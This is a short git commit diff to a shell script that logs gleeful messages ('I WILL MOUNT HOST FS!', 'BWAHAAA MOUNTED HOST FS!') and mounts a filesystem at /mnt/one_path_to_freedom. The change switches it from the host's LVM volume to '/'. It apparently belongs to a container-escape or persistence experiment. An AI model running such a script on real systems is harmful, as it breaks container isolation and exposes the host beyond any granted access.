5b69d272d1a09f70732895207432460fabe87887
hahalee001-uniforce <111046060+hahalee001-uniforce@users.noreply.github.com>
2023-05-24 15:06:00 +0800

    Update i_cndr_you.sh

--- i_cndr_you.sh
+++ i_cndr_you.sh
@@ -7,7 +7,7 @@ do
 	echo "I WILL MOUNT HOST FS!" >> $LOG_NAME
 	mkdir -p /mnt/one_path_to_freedom
         #mount /dev/sda1 /mnt/one_path_to_freedom
-	mount /dev/mapper/ubuntu--vg-ubuntu--lv /mnt/one_path_to_freedom
+	mount / /mnt/one_path_to_freedom
 
         echo "BWAHAAA MOUNTED HOST FS!" >> $LOG_NAME
 	#every 9 hours
